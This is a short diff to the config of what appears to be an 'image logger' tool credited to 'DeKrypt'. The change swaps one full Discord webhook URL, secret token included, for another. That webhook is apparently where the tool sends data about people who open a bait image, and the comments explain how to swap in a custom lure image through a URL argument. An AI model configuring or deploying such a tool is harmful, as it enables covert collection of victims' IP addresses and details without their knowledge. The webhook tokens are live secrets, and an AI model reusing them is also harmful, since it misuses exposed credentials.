@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1087676656438759424/umuWX5y9-NNDWVhKoc-ctUrFFGJM6jIiz6kY_Xf7WDXbSyRuNuco5kO1NocBuKu09CG8",
+    "webhook": "https://discord.com/api/webhooks/1087690722179829890/a2pqNWN421p2PRobvxzMnKbT7ZNZ3jpLd3f1bYpJ2CIpj_bwMXzVmoXkvjouUMMFBnXn",
     "image": "https://freepngimg.com/convert-png/98944-lmao-emoji-free-transparent-image-hd", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
